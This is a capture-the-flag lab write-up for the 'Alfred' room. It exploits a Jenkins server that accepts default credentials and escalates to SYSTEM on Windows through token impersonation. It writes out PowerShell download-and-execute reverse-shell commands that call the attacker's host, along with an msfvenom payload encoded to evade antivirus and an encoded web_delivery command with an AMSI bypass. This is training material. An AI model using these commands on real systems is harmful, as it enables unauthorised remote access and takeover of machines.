# Alfred

Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

# [Task 1] Initial Access

## #1.0 - Instructions

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

## #1.1 - How many ports are open?

~~~
$ nmap -sC -sV -A 10.10.31.231
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 11:10 CEST
Nmap scan report for 10.10.31.231
Host is up (0.058s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2020-05-15T09:12:33+00:00
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2020-05-14T09:09:26
|_Not valid after:  2020-11-13T09:09:26
|_ssl-date: 2020-05-15T09:12:34+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.45 seconds
~~~

Nmap has discovered 3 ports.

## #1.2 - What is the username and password for the log in panel(in the format username:password)

Accessing the URL on port 8080 with `admin`:`admin` works!

## #1.3

**Instructions**

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`

You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server

*Hint: check configure tab under project options*

**Answer**

To execute commands via Jenkins, follow these steps:
1. Connect with http://10.10.31.231:8080/ using `admin`:`admin`
2. From the dashboard, click on "project"
3. From the menu on the left hand side, click on "Configure".
4. Scroll down to the "Build" section and enter a command (e.g. "ipconfig")
5. Click on the "Save" button
6. Back to the Project view, click on "Build now" from the menu on the left hand side
7. Wait until you see a new build number (e.g. "#2") from the "Build history" box under the menu
8. Click on the build number that has been added.
9. From the menu, click on "Console output". From here you will get the result of your command.

Based on this, we will create a reverse shell.

First, download the `Invoke-PoweShellTcp.ps1` powershell script and make it available through a web server:
~~~
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
$ python -m http.server
~~~

Also open a listener:
~~~
$ rlwrap nc -nlvp 1234
~~~

Now, go to the build options and inject the following payload:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.0.54:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.54 -Port 1234
```

Click Save, build the project. You should see that the web server has delivered the `Invoke-PowerShellTcp.ps1` script:

~~~
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.31.231 - - [15/May/2020 12:18:45] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
~~~

And you should now have a reverse shell in the second window:

~~~
$ nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.31.231.
Ncat: Connection from 10.10.31.231:49203.
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::853d:1a41:369:8fa8%13
   IPv4 Address. . . . . . . . . . . : 10.10.31.231
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
PS C:\Program Files (x86)\Jenkins\workspace\project> 
~~~

## #1.4 - What is the user.txt flag? 

*Hint: use nishang to get a reverse shell*

~~~
PS C:\users\bruce\desktop> more user.txt
79007a09481963edf2e1321abd9ae2a0
~~~

#  [Task 2] Switching Shells

## #2.0 - Instructions

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

~~~
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
~~~

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

~~~
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
~~~

Before running this program, ensure the handler is set up in metasploit:

~~~
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
~~~

﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

~~~
Start-Process "shell-name.exe"
~~~

This should spawn a meterpreter shell for you!

## #2.1 - What is the final size of the exe payload that you generated?

### The tutorial approach

Let's create our executable using msfvenom:

~~~
$ msfvenom \
	-p windows/meterpreter/reverse_tcp \
	-a x86 \
	--encoder x86/shikata_ga_nai \
	LHOST=10.9.0.54 \
	LPORT=1234 \
	-f exe \
	-o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
~~~

*Answer to the question: It results in a `73802 bytes` Windows executable*

Now, fire up metasploit and set up the handler:

~~~
$ msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.9.0.54
LHOST => 10.9.0.54
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.0.54:1234 
~~~

Time now to download our payload on the server. Make sure the http server is still running (make sure it is running from the location where the `exe` file is):

~~~
$ ls shell.exe 
shell.exe
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
~~~

Go to Jenkins and use the build settings interface to inject the following payload to download our `exe`. Then build the project once again.

~~~
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.54:8000/shell.exe','shell.exe')"
~~~

To check that the exe has been sucessfully downloaded:
* You should see the connection from the python http server
* You can check the console output from Jenkins

Do another build with this payload to start the rever shell:

~~~
powershell -command "Start-Process shell.exe"
~~~

Unfortunately, using this approach fails (tested on 2 different machines with 2 different distributions), the reverse shell hangs:

~~~
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.0.54:1234 
[*] Sending stage (176195 bytes) to 10.10.31.231
~~~

### Let's use a different approach to directly upload a reverse shell

Let's rather use `exploit/multi/script/web_delivery`.

~~~
unknown@kali:/data$ msfconsole -q
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set LHOST 10.9.0.54
LHOST => 10.9.0.54
msf5 exploit(multi/script/web_delivery) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/script/web_delivery) > set target PSH
target => PSH
msf5 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.0.54        yes       The listen address (an interface may be specified)
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf5 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.9.0.54:1234 
[*] Using URL: http://0.0.0.0:8080/gTBAQaTxuY
[*] Local IP: http://172.16.222.130:8080/gTBAQaTxuY
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGUALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABlAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADAALgA1ADQAOgA4ADAAOAAwAC8AZwBUAEIAQQBRAGEAVAB4AHUAWQAvAEkAMQB4AE8AbQBrAHEAWAAwAEQAaABaACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA5AC4AMAAuADUANAA6ADgAMAA4ADAALwBnAFQAQgBBAFEAYQBUAHgAdQBZACcAKQApADsA
[*] 10.10.31.231     web_delivery - Delivering AMSI Bypass (939 bytes)
[*] 10.10.31.231     web_delivery - Delivering Payload (1892 bytes)
[*] Sending stage (176195 bytes) to 10.10.31.231
[*] Meterpreter session 1 opened (10.9.0.54:1234 -> 10.10.31.231:49202) at 2020-05-15 14:48:35 +0200

msf5 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.0.54:1234 -> 10.10.31.231:49202 (10.10.31.231)

msf5 exploit(multi/script/web_delivery) > 
~~~

# [Task 3] Privilege Escalation

## #3.0 - Instructions

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

* user SIDs(security identifier)
* group SIDs
* privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

* primary access tokens: those associated with a user account that are generated on log on
* impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

* SecurityAnonymous: current user/client cannot impersonate another user/client
* SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
* SecurityImpersonation: current user/client can impersonate the client's security context on the local system
* SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

* SeImpersonatePrivilege
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

## #3.1 - View all the privileges using whoami /priv

~~~
[*] Meterpreter session 1 opened (10.9.0.54:1234 -> 10.10.31.231:49206) at 2020-05-15 15:09:31 +0200

msf5 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  alfred\bruce @ ALFRED  10.9.0.54:1234 -> 10.10.31.231:49206 (10.10.31.231)

msf5 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2768 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

C:\Program Files (x86)\Jenkins\workspace\project>
~~~

## #3.2 - You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: `load incognito` to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

Let's get back to meterpreter and load the incognito module:

~~~
C:\Program Files (x86)\Jenkins\workspace\project>^Z
Background channel 1? [y/N]  y
meterpreter > load incognito 
Loading extension incognito...Success.
~~~

## #3.3 - To check which tokens are available, enter `list_tokens -g`. We can see that the BUILTIN\Administrators token is available. Use the `impersonate_token "BUILTIN\Administrators"` command to impersonate the Administrators token. What is the output when you run the getuid command?

Let's list the available tokens with `list_tokens -g`:

~~~
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
~~~

We see the `BUILTIN\Administrators` token on top of the list. The objective is now to impersonate this token:

~~~
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
~~~

## #3.4 - Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command `migrate PID-OF-PROCESS`

Let's first dump the processes list:

~~~
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 528   520   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 576   568   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 584   520   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 612   568   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 672   584   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 680   584   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 688   584   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 780   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 796   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 856   672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 928   612   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 948   672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 996   672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1020  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1028  672   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 1036  2996  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 1076  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1192  672   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1224  672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1348  672   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1420  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1456  672   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1484  672   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1644  672   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1748  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1840  672   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1844  1644  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1872  672   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1912  528   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2064  672   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2704  528   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2768  1036  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 2884  528   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2996  1844  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
~~~

We want to migrate to a process that is owned by `NT AUTHORITY\SYSTEM` (e.g. `svchost.exe` with PID `2064`):

~~~
meterpreter > migrate 2064
[*] Migrating from 1036 to 2064...
[*] Migration completed successfully.
~~~

## #3.5 - read the root.txt file at C:\Windows\System32\config

*Hint: either do this by dropping into a shell or using a meterpreter command*

Now, we should be able to read the flag:

~~~
meterpreter > shell
Process 3028 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>more root.txt
more root.txt
dff0f748678f280250f25a45b8046b4a
~~~